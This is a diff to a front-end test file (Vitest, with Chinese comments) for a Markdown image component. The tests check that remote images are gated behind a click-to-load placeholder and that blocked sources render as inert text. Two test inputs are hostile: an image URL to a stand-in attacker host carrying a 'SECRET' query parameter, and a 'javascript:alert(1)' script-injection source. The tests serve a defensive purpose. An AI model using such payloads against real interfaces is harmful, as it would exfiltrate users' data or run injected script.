@@ -86,7 +86,9 @@ const withPreviewContext = <T,>(open: OpenFn, body: () => T, inside = false): T 
   }
 };
 
-const URL_A = "https://example.com/a.png";
+// 站内上传路径：不是远程图（远程 http(s) 图默认只渲染占位、点击才加载，见下面单独的用例），
+// 这组用例钉的是「已确认可渲染的图」的灯箱数据 / 提示 / 懒加载
+const URL_A = "/api/tasks/t1/uploads/a.png";
 
 const renderMarkdownImage = (props: ComponentProps<typeof MarkdownImage>) => {
   const open = vi.fn<OpenFn>();
@@ -131,6 +133,32 @@ describe("MarkdownImage：点开大图 / 悬浮提示 / 懒加载（B6-4 自己�
     expect(img.props.loading).toBe("lazy");
     expect(img.props.src).toBe(URL_A);
     expect(img.props.alt).toBe("登录页截图");
+  });
+});
+
+describe("MarkdownImage 遇到远程 http(s) 图：交给 RemoteMarkdownImage，自己的元素树里没有 <img> / <button>（前端安全硬化）", () => {
+  it("远程图 → 子组件元素（占位 / 点击加载在它里面），分发器本身不出 img", () => {
+    const open = vi.fn<OpenFn>();
+    const rendered = withPreviewContext(open, () =>
+      MarkdownImage({ src: "https://evil.example/p?d=SECRET", alt: "图" }),
+    ) as El;
+    expect(typeof rendered.type).toBe("function");
+    const els = flatten(rendered);
+    expect(els.some((e) => e.type === "img")).toBe(false);
+    expect(els.some((e) => e.type === "button")).toBe(false);
+    expect(rendered.props.src).toBeUndefined(); // URL 只在 gate（内存）里，元素上没有 src 属性
+    expect(open).not.toHaveBeenCalled();
+  });
+
+  it("畸形 / 被拦 → 纯文本占位，没有 img、没有 button、没有可点击的东西", () => {
+    const open = vi.fn<OpenFn>();
+    const rendered = withPreviewContext(open, () =>
+      MarkdownImage({ src: "javascript:alert(1)", alt: "图" }),
+    ) as El;
+    expect(rendered.type).toBe("span");
+    const els = flatten(rendered);
+    expect(els.some((e) => e.type === "img" || e.type === "button")).toBe(false);
+    expect(rendered.props.onClick).toBeUndefined();
   });
 });
 
